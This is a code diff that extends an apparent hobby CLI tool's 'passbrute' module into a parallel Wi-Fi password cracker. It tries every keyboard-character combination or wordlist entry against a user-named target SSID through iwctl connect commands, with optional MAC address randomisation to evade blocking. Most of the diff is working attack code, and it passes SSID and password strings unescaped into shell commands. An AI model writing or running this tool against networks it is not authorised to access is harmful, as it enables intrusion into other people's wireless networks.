@@ -3,9 +3,64 @@ import typer
 import time
 import rich
 from rich.progress import Progress, TextColumn, BarColumn, TimeElapsedColumn, SpinnerColumn
+import string
+import itertools
+import subprocess
+from multiprocessing import Pool
 
 
 app = typer.Typer()
+
+
+def generate_brute_force(min_length=1, max_length=8):
+    """
+    Generate all possible passwords using English keyboard characters.
+    Includes: letters, digits, and special characters
+    """
+    # All characters on an English keyboard
+    characters = string.ascii_letters + string.digits + string.punctuation
+    
+    for length in range(min_length, max_length + 1):
+        for combination in itertools.product(characters, repeat=length):
+            yield ''.join(combination)
+
+
+def check_password(args):
+    """
+    Fast password checker - runs in a worker process.
+    Returns (password, success, False) where False means "keep searching"
+    Returns (password, True, True) when password is found
+    """
+    password, target_ssid = args
+    try:
+        # Connect with timeout
+        result = subprocess.run(
+            f"iwctl station wlan0 connect {target_ssid} password {password}",
+            shell=True,
+            capture_output=True,
+            timeout=3,
+            text=True
+        )
+        
+        # Quick check without sleep for speed
+        check = subprocess.run(
+            "iwctl station wlan0 show",
+            shell=True,
+            capture_output=True,
+            timeout=2,
+            text=True
+        )
+        
+        output = check.stdout.lower()
+        
+        # Check if connected
+        if f"connected network: {target_ssid.lower()}" in output or \
+           (target_ssid in output and "connected" in output):
+            return (password, True, True)
+        else:
+            return (password, False, False)
+    except Exception as e:
+        return (password, False, False)
 
 
 def passbrute():
@@ -37,7 +92,6 @@ def passbrute():
 
         def up(): # pyright: ignore[reportSelfClsParameterName]
             os.system("sudo ip link set wlan0 up")
-
 
     typer.echo("Running in passbrute mode...")
     
@@ -76,40 +130,67 @@ def passbrute():
     target_ssid = input("Type target SSID: ")
     time.sleep(1)
     print("Type path to word list (none will do random from minimum 8 characters): ")
-    wordlist_path = input("Path (can be stored in src/modules/passbrute/word_lists/): ").strip()
-    # Python is very picky with paths, need a way to make it better
+    wordlist_name = input("Wordlist name (wordlists can be stored in src/modules/passbrute/word_lists/): ").strip()
     
+    use_brute_force = False
+    passwlist = []
+    
+    if not wordlist_name:
+        # Empty input - use brute force
+        typer.echo("No wordlist provided. Using brute force mode...")
+        use_brute_force = True
+    else:
+        wordlist_path = os.path.join("src/modules/passbrute/word_lists", wordlist_name)
+        
+        if not os.path.exists(wordlist_path):
+            print(f"Error: Wordlist file not found at {wordlist_path}")
+            fallback = input("Use brute force instead? (y/n): ").strip().lower()
+            if fallback == 'y':
+                use_brute_force = True
+            else:
+                typer.echo("Aborting...")
+                return
+        else:
+            print("File found!")
+            with open(wordlist_path, 'r', encoding="utf-8") as f:
+                passwlist = [line.strip() for line in f]
+                # Make this remove empty lines and spaces, also make |>> text<<| a comment in the wordlist file so that you can add comments to the wordlist file and it will ignore them.
+                passwlist = [line.strip() for line in passwlist if line.strip() and not (line.startswith("|>> ") and line.endswith(" <<|"))]
 
-    with open(wordlist_path, 'r', encoding="utf-8") as f:
-        passwlist = [line.strip() for line in f]
-        # Make this remove empty lines and spaces, also make |>> text<<| a comment in the wordlist file so that you can add comments to the wordlist file and it will ignore them.
-        passwlist = [line.strip() for line in passwlist if line.strip() and not (line.startswith("|>> ") and line.endswith(" <<|"))]
-
-    if not wordlist_path:
-        typer.echo("Using default brute force ")
-        time.sleep(1)
-        use_def_brute = True
+    if use_brute_force:
+        min_len = int(input("Minimum password length (default 1): ") or 1)
+        max_len = int(input("Maximum password length (default 8): ") or 8)
+        password_generator = generate_brute_force(min_len, max_len)
+    else:
+        password_generator = passwlist
 
     passw = ""
-
-    if wordlist_path:
-        for i in passwlist:
-            if mac_change_preference_bool:
-                mac.rand() # pyright: ignore[reportAttributeAccessIssue]
-            os.system(f"iwctl station wlan0 connect {target_ssid} password {i}")
+    
+    # Use multiprocessing for parallel password attempts
+    try:
+        # Determine number of cores - use 4 to avoid overwhelming the system
+        num_cores = min(4, os.cpu_count() or 4)
+        
+        with Pool(processes=num_cores) as pool:
+            # Create args list: (password, target_ssid) pairs
+            args_list = [(pwd, target_ssid) for pwd in password_generator]
             
-            
-            connected_check = os.popen(f"iwctl station wlan0 show")
-            connected_check_output = connected_check.read()
-
-            # Check if 'connected' is in the text
-            if "connected" in connected_check_output.lower():
-                # Need to make it more obvious that the password is correct
-                print("✅ Crakd! Password is: " + i)
-                passw = i
-                break
-            else:
-                print("❌ No! Tried password: " + i)
+            # Use imap_unordered for fastest results (doesn't maintain order)
+            for password, success, _ in pool.imap_unordered(check_password, args_list, chunksize=1):
+                if success:
+                    print(f"✅ Cracked! Password is: {password}")
+                    passw = password
+                    pool.terminate()
+                    break
+                else:
+                    print(f"❌ Tried password: {password}")
+    except KeyboardInterrupt:
+        print("\nBrute force interrupted by user")
+        pool.terminate()
+        return
+    except Exception as e:
+        print(f"Error during brute force: {e}")
+        return
     
     print(passw)
 
@@ -130,3 +211,4 @@ def passbrute():
         
         Should be working by W9 but not close to polished
     """
+
